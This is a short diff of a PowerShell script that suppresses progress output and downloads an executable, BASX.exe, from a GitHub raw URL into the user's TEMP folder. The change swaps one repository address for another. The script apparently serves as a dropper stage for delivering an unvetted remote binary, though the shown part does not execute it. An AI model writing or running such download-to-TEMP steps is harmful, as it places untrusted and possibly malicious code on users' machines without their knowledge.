@@ -1,5 +1,5 @@
 $ProgressPreference = 'SilentlyContinue'
-$url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"
+$url = "https://github.com/relaxwtf777-lang/cmd/raw/refs/heads/main/BASX.exe"
 $output = "$env:TEMP\BASX.exe"
 
 Invoke-WebRequest -Uri $url -OutFile $output
